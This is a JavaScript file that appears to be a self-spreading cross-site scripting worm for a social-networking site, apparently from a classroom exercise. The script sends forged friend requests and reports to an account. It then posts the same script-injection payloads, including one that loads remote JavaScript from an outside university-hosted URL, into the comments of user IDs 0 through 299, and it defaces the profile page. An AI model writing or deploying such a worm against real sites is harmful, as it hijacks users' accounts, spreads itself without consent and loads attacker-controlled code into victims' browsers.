const payload = "</script></style>---><script src='http://people.rit.edu/msf9542/bingus.js'></script>";

function add_friend() {
    var request = new XMLHttpRequest();
	request.open("GET", `/add_friend.php?id=95`, true);
	request.send();
}

add_friend();

function friend_message() {
    var today = new Date();
    var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
    var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
    var dateTime = '--->' + date + ' ' + time + '<br>' + '<!---';
    return dateTime;
}

function add_comment(user_id, comment) {
    var request = new XMLHttpRequest();
	request.open("GET", `/add_comment.php?id=${user_id}&comment=${encodeURIComponent(comment)}`, true);
	request.send();
}

function add_report_comment() {
	add_comment(95, friend_message())
}

add_report_comment();

for(let user_id = 0; user_id < 300; user_id++) {
    if (user_id != 95) {
        add_comment(user_id, payload);
        add_comment(user_id, '--><script>var _0x9953=["\x62\x69\x6E\x67\x75\x73"];alert(_0x9953[0])</script>')
        add_comment(user_id, "<script src='http://people.rit.edu/msf9542/bingus_again.js'></script>")
    }
}

document.getElementById('name').innerText = "Bingus";
document.body.style.backgroundImage = "url(https://c.tenor.com/n-3Z3MGgz2UAAAAd/bingus-blink.gif)";
document.getElementsByClassName('fb-image-profile')[0].src = "https://c.tenor.com/n-3Z3MGgz2UAAAAd/bingus-blink.gif";
document.getElementById("about_info").innerHTML = "<img src=https://c.tenor.com/n-3Z3MGgz2UAAAAd/bingus-blink.gif>";
